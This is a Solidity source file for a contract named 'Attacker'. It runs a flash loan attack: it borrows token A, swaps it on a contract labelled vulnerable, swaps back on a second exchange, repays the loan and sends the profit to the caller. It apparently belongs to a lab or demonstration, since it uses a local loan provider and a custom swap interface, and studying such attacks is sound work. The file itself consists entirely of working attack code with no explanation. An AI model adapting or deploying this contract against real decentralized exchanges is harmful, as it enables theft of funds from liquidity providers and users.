// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanProvider.sol";


/// @title ISwap
/// @dev Interface for a token swap contract.
interface ISwap {
    function swapTokens(uint) external returns(uint);
}


/// @title Attacker
/// @dev A contract to perform a flash loan attack on vulnerable token swap contracts.
contract Attacker {
    FlashLoanProvider public flashLoanProvider;
    ISwap public vulnerableTokenSwap;
    ISwap public secondExchange;
    IERC20 public tokenA;
    IERC20 public tokenB;


    /// @notice Initialize the attacker contract with required dependencies.
    /// @param _flashLoanProvider The address of the flash loan provider.
    /// @param _vulnerableTokenSwap The address of the vulnerable token swap contract.
    /// @param _secondExchange The address of the second token swap contract.
    /// @param _tokenA The address of tokenA.
    /// @param _tokenB The address of tokenB.
    constructor(
        FlashLoanProvider _flashLoanProvider,
        ISwap _vulnerableTokenSwap,
        ISwap _secondExchange,
        IERC20 _tokenA,
        IERC20 _tokenB
    ) {
        flashLoanProvider = _flashLoanProvider;
        vulnerableTokenSwap = _vulnerableTokenSwap;
        secondExchange = _secondExchange;
        tokenA = _tokenA;
        tokenB = _tokenB;
    }


    /// @notice Execute a flash loan attack.
    /// @param amount The amount of tokenA to borrow in the flash loan.
    /// @return A boolean value indicating if the attack was successful.
    function executeFlashLoan(uint256 amount) external returns (bool){
        // Approve the transfer of `amount` tokenA to the vulnerableTokenSwap contract.
        tokenA.approve(address(vulnerableTokenSwap), amount);


        // Swap `amount` of tokenA for tokenB using the vulnerableTokenSwap contract.
        uint256 tokenBAmount = vulnerableTokenSwap.swapTokens(amount);


        // Approve the transfer of `tokenBAmount` tokenB to the secondExchange contract.
        tokenB.approve(address(secondExchange), tokenBAmount);


        // Swap `tokenBAmount` of tokenB for tokenA using the secondExchange contract.
        secondExchange.swapTokens(tokenBAmount);


        // Transfer `amount` of tokenA back to the flashLoanProvider contract.
        tokenA.transfer(address(flashLoanProvider), amount);


        // Return true to indicate the successful execution of the flash loan attack.
    return true;
    }

    /// @notice Execute the attack with a specified amount of tokenA.
    /// @param amount The amount of tokenA to use in the attack.
    function executeAttack(uint256 amount) external {
        flashLoanProvider.flashLoan(amount, address(this));
        tokenA.transfer(msg.sender, (tokenA.balanceOf(address(this))));
    }
}
